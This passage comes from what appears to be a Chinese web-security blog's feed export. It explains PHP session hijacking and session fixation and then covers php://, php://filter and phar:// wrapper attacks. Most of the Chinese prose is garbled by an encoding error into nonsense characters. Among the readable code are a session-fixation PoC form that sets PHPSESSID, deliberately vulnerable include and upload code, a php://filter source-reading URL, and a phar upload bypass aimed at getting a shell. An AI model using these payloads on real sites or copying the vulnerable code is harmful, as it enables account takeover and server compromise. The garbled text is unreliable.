getÔºàÂæàÂ∞ëËßÅÔºâÔºåÊàñËÄÖÁî±urlÈáçÂÜôÊù•ÂÆåÊàêÔºåËøòÊúâ‰∏ÄÈÉ®ÂàÜÂ≠òÂÇ®Âú®ÈöêËóèÂüü‰∏≠Ôºå‰∏ÄËà¨È¶ñÈÄâÊòØÂ≠òÂÇ®Âú®cookie‰∏≠ÔºåÂΩìÁ¶ÅÁî®‰∫Ücookie‰º†ÈÄí‰πãÂêéÂ∞±‰ºöÈáçÂÜôÂú®urlÈáåÔºåÂú®urlÈáå‰º†ÈÄíÂæàÂÆπÊòìÊö¥Èú≤ÈÄ†ÊàêÊõ¥Â§öÁöÑÂÆâÂÖ®ÈóÆÈ¢òÔºåÂú®ÂÖÅËÆ∏cookie‰º†ÈÄíÁöÑÊó∂ÂÄôÈ¶ñÈÄâcookieÔºåÂú®php‰∏≠Êèê‰æõ‰∫Üsession.use_only_cookiesÈÄâÈ°πÔºå sessionÂä´ÊåÅÂÆûÈôÖ‰∏äÂ∞±ÊòØËá™Â∑±ÁöÑPHPSESSIDË¢´ÊîªÂáªËÄÖ‰ª•ÊüêÁßçÊñπÂºèËé∑ÂèñÔºåÁÑ∂ÂêéÂú®‰ºöËØùÁöÑÊúâÊïàÊúüÂÜÖÔºåÂà©Áî®Ë¢´ÊîªÂáªËÄÖÁöÑË∫´‰ªΩÁôªÂΩïÁΩëÁ´ôÔºåÊù•ËææÂà∞Ë∫´‰ªΩÂä´ÊåÅÔºå‰º™Ë£ÖÊàêÂêàÊ≥ïÁî®Êà∑„ÄÇ‰∏ÄËà¨PHPSESSIDÂ≠òÂÇ®Âú®cookie‰∏≠ÔºåXSSÊîªÂáª‰πü‰ºöÈÄ†ÊàêsessionÂä´ÊåÅ„ÄÇ sessionÊàêÂäüÂä´ÊåÅ‰∏ÄËà¨ÈúÄË¶ÅÂá†‰∏™Ê≠•È™§Ôºå 1.Áî®Êà∑ËÆøÈóÆÁöÑÂπ≥Âè∞ÊòØ‰ΩøÁî®sessionÊù•ËøõË°åË∫´‰ªΩËÆ§ËØÅ„ÄÇ2.Áî®Êà∑Â∑≤Áªè‰ΩøÁî®Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÂΩïËØ•Âπ≥Âè∞ÔºåÈöèÂç≥ËØ•Áî®Êà∑‰ºöÂæóÂà∞‰∏Ä‰∏™sessionid„ÄÇ3.ÈÄöËøáÂä´ÊåÅËé∑ÂèñÂà∞sessionidÔºåÂπ∂‰∏îÂú®sessionidÁöÑÊúâÊïàÊúüÂÜÖ‰ΩøÁî®ÔºàÊú™Ê≥®ÈîÄÂâçÔºâ„ÄÇ ÈÇ£‰πàÂ¶Ç‰ΩïËé∑ÂæósessionidÊòØÂÖ≥ÈîÆÔºåÊé•‰∏ãÊù•‰ºöË∞àÂà∞Ôºå‰∏ÄËà¨ÂèØ‰ª•‰ΩøÁî® 1.Âä´ÊåÅÔºöXSSÂä´ÊåÅÔºåÂ±ÄÂüüÁΩëÂóÖÊé¢Ôºå‰ºöËØùÂõ∫ÂÆöÁªìÂêàÔºå‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÁ≠âÁ≠â„ÄÇ2.ÁàÜÁ†¥ÔºöÁõ¥Êé•ÈÄöËøáÂ§ßÊµÅÈáèÁàÜÁ†¥Âá∫sessionidÔºà‰∏ÄËà¨ÊòØ‰∏çÂ§™ÂèØËÉΩ)„ÄÇ3.ÂæóÂà∞sessionÁîüÊàêËßÑÂàôÔºåÂπ∂‰∏îÂæóÂà∞Á≠æÂêçÈÄöËøáËÆ°ÁÆóËé∑Âèñ„ÄÇ ËßÑÂàôÁàÜÁ†¥ÈÄöËøáÁü•ÈÅìËßÑÂàôÊù•ËøõË°åÁàÜÁ†¥Ôºå‰∏çËøáËøôÁßçÊñπÊ≥ïÂü∫Êú¨‰∏äÊòØÊ≤°ÂèØËÉΩÁöÑÂ±ÄÈôêÊÄßÂ§™Â§öÔºå‰∏îÊ¶ÇÁéáÊûÅÂ∞èÔºåphp‰∏≠ÁöÑsessionid‰∏æ‰æãËÄåË®Ä„ÄÇÁîüÊàêËßÑÂàôÂ¶Ç‰∏ã„ÄÇ PHPSESSIDÁîüÊàêÁîüÊàêËßÑÂàôÊòØÊ†πÊçÆhash_funcÊï£ÂàóÊù•ÁîüÊàêÁöÑÔºåÁõ∏ÂÖ≥ÁöÑÂèÇÊï∞ÊúâÔºö ÂÆ¢Êà∑Á´ØIP ÂΩìÂâçÊó∂Èó¥ÔºàÁßíÔºâ ÂΩìÂâçÊó∂Èó¥ÔºàÂæÆÁßíÔºâ PHPËá™Â∏¶ÁöÑÈöèÊú∫Êï∞Áîü‰∫ßÂô® ÁßíÂæÆÁßíÂèØ‰ª•ÁàÜÁ†¥ÔºåÈöèÊú∫Êï∞‰πüÂèØËÉΩÊòØ‰º™ÈöèÊú∫ÔºåÂÆ¢Êà∑Á´ØIP‰πüÂèØ‰ª•ÊüêÁßçÊâãÊÆµËé∑ÂèñÔºå‰ΩÜÊòØÂõõÁßçÂêåÊó∂Á≤æÂáÜËé∑ÂèñÔºåÈöæÂ∫¶ÊûÅÂ§ßÔºå‰ΩÜÊòØ‰∏çÊéíÈô§ÊúâÊàêÂäüÁöÑÂèØËÉΩÊÄß„ÄÇÊ†πÊçÆÁîüÊàêËßÑÂàôÔºå‰πüÊúâÂèØËÉΩÁàÜÁ†¥Âá∫Ôºå‰ΩÜÊòØÁõ∏ÂØπÊù•ËØ¥Âá†‰πé‰∏çÂ§™ÂèØËÉΩ„ÄÇ Âà©Áî®XSSÊàñËÄÖÊñá‰ª∂ËØªÂèñÂà©Áî®xssÂèçÂºπÂà∞ÁöÑcookieÔºåÊù•‰º™ÈÄ†Ë∫´‰ªΩÁôªÂΩï„ÄÇ‰ΩøÁî®Ë¢´ÊîªÂáªËÄÖÁöÑPHPSESSIDÔºårv3kprfodknmqdrnf0cuial8r6 Âç≥ÂèØÂà©Áî®ÁÆ°ÁêÜÂëòÁöÑsessionÊù•ÁôªÂΩïÔºåÂâçÊèêÊòØÂøÖÈ°ªÂú®‰ºöËØùÊúâÊïàÊúüÂÜÖ‰ΩøÁî®„ÄÇ ÊàñËÄÖÂà©Áî®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÔºåXXEÁ≠âÊù•ËøõË°åËØªÂèñÊñá‰ª∂ÂêçÊù•Ëé∑ÂèñsessionidÔºåÊúçÂä°Á´Ø‰øùÂ≠òÁöÑÈÉΩÊòØÂú®ÊúâÊïàÊúüÂÜÖÁöÑsession„ÄÇ ‰ºöËØùÂõ∫ÂÆöÂä´ÊåÅ‰ºöËØùÂõ∫ÂÆö‰πüÂ±û‰∫éÂä´ÊåÅÁöÑ‰∏ÄÁßçÔºåÊàñËÄÖËØ¥‰ªñÊòØÈÄöËøáÊîªÂáªËÄÖËØ±ÂØº‰ΩøÁî®Âõ∫ÂÆöÁöÑsessionid„ÄÇ‰ºöËØùÂõ∫ÂÆöÁöÑÊµÅÁ®ã‰∏ªË¶Å‰∏∫ 1.ÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†urlÂèÇÊï∞ÊàñËÄÖË°®Âçï‰º†ÈÄíÊù•Âõ∫ÂÆösessionid„ÄÇ2.ËØ±‰ΩøÁî®Êà∑‰ΩøÁî®ÊîªÂáªËÄÖÊûÑÈÄ†ÁöÑÂèÇÊï∞Êù•ÁôªÈôÜ„ÄÇ3.Âú®Áî®Êà∑ÁôªÂΩï‰πãÂêéÔºåÊîªÂáªËÄÖÁõ¥Êé•‰ΩøÁî®Ëá™Â∑±‰πãÂâçÊûÑÈÄ†ÁöÑÂõ∫ÂÆösessionidÊù•ÁôªÈôÜ„ÄÇ ‰ºöËØùÂõ∫ÂÆöÊºèÊ¥ûÂπ∂‰∏çÂ∏∏ËßÅÔºåÂπ∂‰∏îÂú®Êó©ÊúüÈÄöÂ∏∏ÊòØ‰ΩøÁî®urlÊù•‰º†ÈÄísessionidÔºåËøôÊ†∑Êõ¥ÊûÅÂ§ßÊñπ‰æø‰∫ÜÊîªÂáªËÄÖÔºåÂõ†‰∏∫Âè™Ë¶ÅÁÆÄÂçïÊûÑÈÄ†‰∏ÄÊù°urlÔºåÂπ∂‰∏îÂØπ‰∫éÁî®Êà∑ÊòØÂæàÊ≠£Â∏∏ÁöÑurlÔºå‰æãÂ¶ÇÔºåwww.taobao.com?sessionid=test123ÔºåÂú®Áî®Êà∑‰ΩøÁî®ËøôÊù°urlÂéªÁôªÈôÜÁöÑÊó∂ÂÄôÂ∞±‰ºöÂõ∫ÂÆö‰∫ÜsessionidÔºåÂ∞±ÂèØËÉΩÈÄ†Êàê‰ºöËØùÂõ∫ÂÆöÂä´ÊåÅÊºèÊ¥û„ÄÇÈáçÁΩÆsessionidÂèØÁî±Â¶Ç‰∏ã„ÄÇ 1.ÈÄöËøáxssÊºèÊ¥ûÔºåÂèØ‰ª•ÈÄöËøájsËÆæÁΩÆcookie‰∏≠ÁöÑsessionid„ÄÇdocument.cookie=‚Äùsessionid=test123‚Äù2.ÈÄöËøáurl‰º†ÈÄíÔºåÁõ¥Êé•ÊûÑÈÄ†url‚Äì&gt;www.taobao.com?sessionid=test1233.‰ΩøÁî®Set-CookieÁöÑHTTPÂìçÂ∫îÂ§¥ÈÉ®ËÆæÁΩÆCookie„ÄÇÊîªÂáªËÄÖÂèØ‰ª•‰ΩøÁî®‰∏Ä‰∫õÊñπÊ≥ïÂú®WebÊúçÂä°Âô®ÁöÑÂìçÂ∫î‰∏≠Âä†ÂÖ•Set-CookieÁöÑHTTPÂìçÂ∫îÂ§¥ÈÉ®,ÈÄöËøáËá™Â∑±ÁöÑÊúçÂä°Âô®È°µÈù¢ÁªëÂÆösessionid„ÄÇ Êé•‰∏ãÊù•Êàë‰ª¨ÈÄöËøá‰∏Ä‰∏™ÁÆÄÂçïÁöÑphpËÆ§ËØÅÊù•ÂÅö‰∏ÄÊ¨°‰ºöËØùÂõ∫ÂÆöÂä´ÊåÅÔºåÂêéÁ´ØÂØπË∫´‰ªΩÈ™åËØÅ‰ª£Á†ÅÂ¶Ç‰∏ã„ÄÇ &lt;?php session_start();?&gt; if($_POST[&apos;zhanghao&apos;] == $username &amp;&amp; $_POST[&apos;mima&apos;] == $password) { $_SESSION[&quot;name&quot;]=$username; } if ($_SESSION[&apos;name&apos;] == &quot;&quot;) { echo &quot;&lt;script&gt;alert(&apos;ÂØπ‰∏çËµ∑Ôºå‰Ω†Ê≤°ÊúâÊùÉÈôê&apos;);location.href=&apos;index.php&apos;&lt;/script&gt;&quot;; }Ê≠§Êó∂ÊîªÂáªËÄÖÊûÑÈÄ†‰∏Ä‰∏™Ë°®ÂçïÈ°µÈù¢„ÄÇÈÄöËøájsÊù•ËÆæÁΩÆcookieÈÄ†Êàê‰ºöËØùÂõ∫ÂÆöÊîªÂáª„ÄÇÊ≠§Êó∂‰ΩøÁî®Êà∑ÁôªÈôÜ„ÄÇ &lt;html&gt; &lt;meta charset=&quot;utf-8&quot; content=&quot;text/html; charset=gb2312&quot;/&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt; &lt;form action=&quot;http://127.0.0.1/login.php&quot; method=&quot;POST&quot;&gt; Áî®Êà∑ÂêçÁß∞Ôºö&lt;input type=&quot;text&quot; name=&quot;zhanghao&quot;&gt;&lt;br/&gt;&lt;br/&gt; Áî®Êà∑ÂØÜÁ†ÅÔºö&lt;input type=&quot;password&quot; name=&quot;mima&quot;&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type=&quot;hidden&quot; name=&quot;denglu&quot; value=&quot;&amp;#153;&amp;#187;&amp;#189;&amp;#149;&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;meta http-equiv=&apos;Set-Cookie&apos; content=&apos;PHPSESSID=22333&apos;&gt; &lt;/form&gt; &lt;script type=&apos;text/javascript&apos;&gt; document.cookie=&apos;PHPSESSID=123456789&apos; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; Ê≠§Êó∂ÊäìÂåÖÂèØ‰ª•ÁúãÂà∞ÔºåÊèê‰∫§ÁöÑSESSIDÊòØÊàë‰ª¨ÊûÑÈÄ†ÁöÑÔºåËÄå‰∏îÊúçÂä°Âô®Á´ØÊöÇÊó∂Êú™ÂàõÂª∫123456789ÁöÑÁî®Êà∑sessionÔºåÁÑ∂ÂêéÁî®Êà∑ÁÇπÂáªÊèê‰∫§„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊúçÂä°Âô®Á´ØÊàêÂäüÂàõÂª∫‰∫ÜÊàë‰ª¨ÊûÑÈÄ†ÁöÑsessionÔºåÁÑ∂ÂêéÊîªÂáªËÄÖ‰æøÂèØ‰ª•ÈÄöËøáPHPSESSID=123456789ÈÄ†ÊàêÂêàÊ≥ïÁôªÈôÜÔºåÁî±Ê≠§‰æøÈÄ†Êàê‰∫Ü‰∏ÄÊ¨°ÂÆåÊï¥ÁöÑ‰ºöËØùÂõ∫ÂÆöÂä´ÊåÅÔºåÂΩìÁÑ∂Â¶ÇÊûúÊòØurl‰º†ÈÄíÂ∞ÜÊõ¥Âä†Êñπ‰æøÔºåÁõ¥Êé•Âú®urlÈáåÂä†ÂÖ•Ëá™Â∑±ÁöÑsessionidÔºåÁî®Êà∑ÁÇπÂáªÊ≠£Â∏∏ÁöÑurlÁôªÈôÜÂç≥ÂèØ„ÄÇ cookieÈÄ†ÊàêÁöÑ‰∏Ä‰∫õÂÆâÂÖ®ÈöêÊÇ£Âú®sessionË∫´‰ªΩËÆ§ËØÅ‰∏≠Ôºå‰∏ÄÂàáÁî®Êà∑ÁöÑsessionÈÉΩ‰ºöÂ≠òÂÇ®Âú®ÊúçÂä°Âô®Ôºå‰ΩÜÊòØÂ¶ÇÊûú‰∏ÄÊó¶Áî®Êà∑ÈáèËææÂà∞‰∏Ä‰∏™‰∏äÈôêÔºåÈÇ£‰πàÂØπ‰∫éÊúçÂä°Âô®ÁöÑËç∑ËΩΩ‰πüÊòØÂ∑®Â§ßÁöÑÔºå‰ΩÜÊòØÂú®cookieÂÆûÁé∞Ë∫´‰ªΩËÆ§ËØÅ‰∏≠ÔºåÂπ∂‰∏ç‰ºöÂ≠òÂÇ®Âú®ÊúçÂä°Âô®ÔºåËÄåÊòØÂ≠òÂÇ®Âú®Áî®Êà∑ÁöÑÂÆ¢Êà∑Á´ØÔºåcookieÁöÑÂá∫Áé∞ÊòØ‰∏ÄÊ¨°ÈáçÂ§ßÁöÑÂèòÈù©Ôºå‰πüÊòØ‰∏ÄÈ°πÈùûÂ∏∏Êúâ‰∫âËÆÆÁöÑÊäÄÊúØÔºåÂéüÂõ†Â∞±ÊòØÂõ†‰∏∫‰ªñÁöÑÈÄèÊòéÊÄß‰ª•Âèä‰ø°ÊÅØÈáèÔºåÂæàÂÆπÊòìÊ≥ÑÈú≤Áî®Êà∑ÁöÑÈöêÁßÅ„ÄÇ Âú®sessionÂ¶ÇÊûú‰∏çËÆæÁΩÆËøáÊúüÊó∂Èó¥ÔºåÂú®ÊúçÂä°Âô®‰∏äÂ∞±‰ºö‰∏ÄÁõ¥Â≠òÂú®ÔºåÊ∞∏Ëøú‰∏ç‰ºöÊ≥®ÈîÄÔºåÂú®cookie‰∏≠Â¶ÇÊûú‰∏çËÆæÁΩÆËøáÊúüÊó∂Èó¥ÔºåÂàôÂú®ÂÖ≥Èó≠ÊµèËßàÂô®Êó∂ÈîÄÊØÅËØ•cookieÔºåsession‰ºöÁªôÊúçÂä°Âô®ÈÄ†ÊàêÂæàÂ§ßÁöÑË¥üËΩΩÔºå‰ΩÜÊòØcookieÂπ∂‰∏çÂ≠òÂú®Ëøô‰∏™ÈóÆÈ¢òÔºåÂÆÉÂ∞Ü‰ø°ÊÅØ‰øùÂ≠òÂú®‰∫ÜÊØè‰∏™Áî®Êà∑ÁöÑÂÆ¢Êà∑Á´Ø„ÄÇÊ∑òÂÆù‰æøÊòØ‰ΩøÁî®‰∫ÜcookieÂ≠òÂÇ®‰∏ÄÈÉ®ÂàÜ‰ø°ÊÅØ„ÄÇ ‰ø°ÊÅØÊ≥ÑÈú≤cookie‰∏≠Â≠òÂèñ‰∫ÜÂ§ßÈáèÁî®Êà∑ÁöÑ‰ø°ÊÅØÔºåÂ¶ÇË∫´‰ªΩidÔºåÊµèËßàÊ¨°Êï∞ÔºåÊâãÊú∫Âè∑ÔºåÁ≠â‰∏Ä‰∫õÈöêÁßÅ‰ø°ÊÅØÔºåÊà™Âèñ‰∫ÜÊüêÂπ≥Âè∞ÁöÑcookie‰ø°ÊÅØÔºåÂ≠òÂÇ®ÁöÑ‰ø°ÊÅØÈáèÈùûÂ∏∏Â§öÔºåCookieÁöÑ‰∏ªË¶ÅÂäüËÉΩÊòØÂÆûÁé∞Áî®Êà∑‰∏™‰∫∫‰ø°ÊÅØÁöÑËÆ∞ÂΩïÔºåÂÆÉÊúÄÊ†πÊú¨ÁöÑÁî®ÈÄîÊòØÂ∏ÆÂä©WebÁ´ôÁÇπ‰øùÂ≠òÊúâÂÖ≥ËÆøÈóÆËÄÖÁöÑ‰ø°ÊÅØÔºåÂèØÊòØ‰∏ÄÊó¶Ê≥ÑÈú≤Èô§‰∫Ü‰ø°ÊÅØÊ≥ÑÈú≤ÔºåÊîªÂáªËÄÖÊó†Áñë‰πüÂèØ‰ª•ÈÄöËøáÁî®Êà∑Ë∫´‰ªΩÁôªÂΩïÔºåÊó†Áñë‰πüÊòØÂæàÂ§ßÁöÑÈöêÊÇ£„ÄÇ Cookie‰ª•Á∫ØÊñáÊú¨ÁöÑÂΩ¢ÂºèÂú®ÊµèËßàÂô®ÂíåÊúçÂä°Âô®‰πãÈó¥‰º†ÈÄÅÔºåÂ§ßÂ§öÊòéÊñáÁöÑÂΩ¢ÂºèË¢´ÈùûÊ≥ïÁî®Êà∑Êà™Ëé∑‰πãÂêéÊó†ÁñëÊòØË∫´‰ªΩË¢´ÁõóÂèñ‰∫ÜÔºåÂπ∂‰∏îË∫´‰ªΩÁöÑ‰ø°ÊÅØ‰πüË¢´ÁõóÂèñ‰∫ÜÔºåÈÄöËøáxssÊºèÊ¥ûÂæàÂÆπÊòìËé∑ÂæócookieÔºåÂ¶ÇÊûúÊ≤°ÊúâÂÅöÂ•ΩÈò≤Êä§Êé™ÊñΩÔºå‰æø‰ºö‰ΩøÁî®Êà∑ÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤„ÄÇ Ë∂äÊùÉÂú®cookieÁöÑË∫´‰ªΩËÆ§ËØÅ‰∏≠ÔºåÊûÅÂÆπÊòìÈÄ†ÊàêË∂äÊùÉÔºåÂàáÂ§ßÂ§öÊï∞Ë∂äÊùÉ‰øÆÊîπÂèÇÊï∞ÈÉΩÊòØÂú®cookie‰∏≠‰øÆÊîπÔºåÂ§ßÂ§öÊï∞cookie‰∏≠‰ºöÊúâÁî®Êà∑ÁöÑuseridÔºåÂ¶ÇÊûúÊú™ÂêàÁêÜÁöÑÂ§ÑÁêÜÊàñËÄÖÂ§öÈáçËÆ§ËØÅÔºåÂæàÂÆπÊòìÈÄ†ÊàêË∂äÊùÉ„ÄÇÂú®ÊüêÂÆâÂÖ®ÂÖ¨Âè∏ÁöÑ‰∏ÄÊ¨°ÊµãËØï‰∏≠ÔºåÊ≠£ÊòØÁî±‰∫é‰∏ÄÊ¨°idÁöÑÊé•Âè£ÈîôËØØÁöÑËÆæÁΩÆÔºåÂØºËá¥Êï∞‰∏áÁî®Êà∑ÁöÑÂπ≥Ë°åË∂äÊùÉÔºåÈÅçÂéÜIDÔºåÈÄ†Êàê‰ø°ÊÅØÁöÑÊ≥ÑÈú≤„ÄÇÂç±ÂÆ≥ÂèØËßÅ‰∏ÄÊñë„ÄÇ ÂèÇËÄÉÔºöhttps://blog.csdn.net/h_mxc/article/details/50542038ÂèÇËÄÉÔºöhttps://blog.csdn.net/u010084228/article/details/78269345]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpÁöÑÂçèËÆÆÊºèÊ¥û]]></title>
    <url>%2F2018%2F12%2F25%2Fphp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[1.php://inputÂú®php‰∏≠ÔºåÂ¶ÇÊûúÈÖçÁΩÆÊñá‰ª∂ÂºÄÂêØ‰∏çÂΩìÔºåÂàôÂèØËÉΩÈÄ†Êàêphp://inputÊù•getshell ÂëΩ‰ª§ÊâßË°å„ÄÇ ÂâçÊèê 1.Âú®allow_url_include = On 2.PHP &gt;= 5.2.0ÂΩìÁÑ∂Â¶ÇÊûúÂºÄÂêØ‰∫ÜËøúÁ®ãÊñá‰ª∂ÂåÖÂê´ÂàôÂèØ‰ª•‰ªªÊÑègetshell„ÄÇ‰∏çËøáÂú®‰∏Ä‰∫õÊîªÈò≤Ëµõ‰∏≠ÔºåËäÇÁ∫¶Êó∂Èó¥Áõ¥Êé•php://inputÂàôÂèØËÉΩÊõ¥Âø´ÁöÑÂæóÂàÜÁïôÂêéÈó®„ÄÇ È¶ñÂÖàÂú®php.ini Êñá‰ª∂ÊâìÂºÄËÆæÁΩÆÂ¶Ç‰∏äÁ¨¨‰∏Ä‰∏™Êù°‰ª∂„ÄÇÊ∫êÁ†Å &lt;?php include($_GET[&apos;url&apos;]); ?&gt;Áõ¥Êé•ËøõË°åÂåÖÂê´Âç≥ÂèØÔºå ÂΩìÁÑ∂ËøôÁßçÊÉÖÂÜµ‰∏ÄËà¨‰∏çÂèØËÉΩÂá∫Áé∞Âú®ÂÆûÊàò‰∏≠ÔºåCTF‰∏≠ÂèØËÉΩ‰ºöÁî®Âà∞ÔºåÊàñËÄÖ‰∏Ä‰∫õÈöêËîΩÂêéÈó®„ÄÇ 2.php://filterÂú®‰∏Ä‰∫õCTF‰∏≠ÔºåÁªèÂ∏∏Áî®Âà∞Êñá‰ª∂ÂåÖÂê´ÈÄ†Êàê‰ªªÊÑèÊñá‰ª∂Ê∫êÁ†ÅËØªÂèñ„ÄÇÂêåÊ†∑ÊºèÊ¥ûÊ∫êÁ†Å &lt;?php include($_GET[&apos;url&apos;]); ?&gt;http://127.0.0.1/000.php?url=php://filter/read=convert.base64-encode/resource=./index.php 3.phar://ÁªïËøá‰∏ä‰º†getshellÂú®‰∏Ä‰∫õËøáÊª§‰∏ä‰º†ÔºåÂè™ÂÖÅËÆ∏‰∏ä‰º†jpgÊñá‰ª∂ÁöÑÊó∂ÂÄôÔºåÂèØ‰ª•ÈÄöËøáphar://ÂçèËÆÆÊù•ÁªïËøá‰∏ä‰º†ÈÄ†Êàêgetshell„ÄÇÊé•‰∏ãÊù•ÂÆû‰æãÔºå‰∏ä‰º†phpÁöÑ‰∏ÄÊÆµ‰ª£Á†Å„ÄÇ &lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0) { echo &quot;Error:&quot;.$FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br/&gt;&quot;; } else { echo &quot;Upload name:&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;].&quot;&lt;br/&gt;&quot;;#Ë¢´‰∏ä‰º†Êñá‰ª∂ÁöÑÂêçÁß∞ echo &quot;Type:&quot;.$_FILES[&quot;file&quot;][&quot;type&quot;].&quot;&lt;br/&gt;&quot;;#‰∏ä‰º†Êñá‰ª∂ÁöÑÁ±ªÂûã echo &quot;size:&quot;.($_FILES[&quot;file&quot;][&quot;size&quot;]/1024).&quot;kb&lt;br/&gt;&quot;;#‰∏ä‰º†Êñá‰ª∂ÁöÑÂ§ßÂ∞èÔºàkbÔºâ echo &quot;Stored in:&quot;.$_FILES[&quot;file&quot;][&quot;tmp_name&quot;].&quot;&lt;br/&gt;&quot;;#Â≠òÂÇ®Âú®ÊúçÂä°Âô®ÁöÑÊñá‰ª∂ÁöÑ‰∏¥Êó∂ÂâØÊú¨ÁöÑÂêçÁß∞ } $waf = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]); if(end($waf)==&quot;jpg&quot;) { if(file_exists(&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;])) { echo $_FILES[&quot;file&quot;][&quot;name&quot;].&quot; already exists&quot;; } else { move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;Stored in :&quot; .&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]; } } else{ echo &apos;&lt;script&gt;alert(&quot;‰∏çÂÖÅËÆ∏‰∏ä‰º†ÁöÑÁ±ªÂûã&quot;)&lt;/script&gt;&apos;; } ?&gt; &lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;/&gt; &lt;br/&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt; &lt;/form&gt;ËøôÊÆµ‰ª£Á†ÅÔºàÁ≤óÁï•ÁöÑÂÜô‰∫Ü‰∏ÄÊ≥¢ÔºåÂÖ∂‰ªñÊñπÂºèÈöè‰æøÁªïËøáÔºâËÆæÁΩÆÂè™ÂÖÅËÆ∏jpg‰∏ä‰º†Ôºå‰ΩÜÊòØÂú®Êüê‰∫õÊù°‰ª∂‰∏ãÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊñá‰ª∂ÂåÖÂê´Êù•ÈÄ†ÊàêÁªïËøá‰∏ä‰º†ÈÖçÂêàÂåÖÂê´getshell„ÄÇ ËøòÊòØÈÖçÂêàÊºèÊ¥û‰ª£Á†Å„ÄÇ &lt;?php include($_GET[&apos;url&apos;]); ?&gt;Êàë‰ª¨ÂÖàÂàõÂª∫‰∏Ä‰∏™phpÊñá‰ª∂ÔºåÁÑ∂ÂêéÂÜôÈ©¨ËøõÂéªÔºåÁÑ∂ÂêéËß£ÂéãÔºåËß£Âéã‰πãÂêé‰øÆÊîπÂêéÁºÄÂêç‰∏∫jpgÔºåÁÑ∂ÂêéÂÜçÂà©Áî®pharÂçèËÆÆËØªÂèñÊñá‰ª∂ÔºåÈÄöËøáÂåÖÂê´ÈÄ†Êàêgetshell„ÄÇ ÂÖ∂ÂÆûÊó¢ÁÑ∂Â≠òÂú®Êñá‰ª∂ÂåÖÂê´ÔºåÂπ∂‰∏çÈúÄË¶ÅpharËØªÂèñÔºåÂçïÁ∫ØjpgÊñá‰ª∂ÂåÖÂê´‰πü‰ºö‰ª•phpËß£ÊûêÔºå‰ΩÜÊòØËøô‰∏çÂ§±‰∏∫‰∏ÄÁßçÁå•ÁêêÊÄùË∑ØÔºåÂú®‰∏Ä‰∫õctf‰∏≠ËøòÊòØÁªèÂ∏∏ËÉΩÈÅáÂà∞ÁöÑ„ÄÇ pharÈÄ†ÊàêÁöÑÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÁéØÂ¢Éapache+php5.4php.ini‰∏≠ÂøÖÈ°ªËÆæÁΩÆphar.readonly=OffÔºå‰∏çÁÑ∂PharÊñá‰ª∂Â∞±‰ºöÊó†Ê≥ïÁîüÊàê„ÄÇÂâçÈù¢ÁöÑÂàÜÂè∑Ê≥®ÊÑèÂéªÊéâ„ÄÇ ÂâçË®ÄÔºåÂú®php‰∏≠ÂØπ‰∏Ä‰∏™Êñá‰ª∂ÂéãÁº©Êó∂ÂÄôÔºåÈÉ®ÂàÜ‰ø°ÊÅØ‰ºöÂ∫èÂàóÂåñÔºåËÄåÈÖçÂêà file_existsÔºà ÔºâÔºåis_dirÔºàÔºâÁ≠âÊñá‰ª∂Ëß£ÊûêÊñá‰ª∂Êó∂‰ºöËøõË°åÂèçÂ∫èÂàóÂåñÔºåËÄåÈÄ†ÊàêÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇÊé•‰∏ãÊù•Êàë‰ª¨ËØ¶Ëß£„ÄÇ 1.a stubÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™Ê†áÂøóÔºåÊ†ºÂºè‰∏∫xxxÔºåÂâçÈù¢ÂÜÖÂÆπ‰∏çÈôêÔºå‰ΩÜÂøÖÈ°ª‰ª•__HALT_COMPILER();?&gt;Êù•ÁªìÂ∞æÔºåÂê¶ÂàôpharÊâ©Â±ïÂ∞ÜÊó†Ê≥ïËØÜÂà´Ëøô‰∏™Êñá‰ª∂‰∏∫pharÊñá‰ª∂„ÄÇ 2.Ê†∏ÂøÉmeta-data 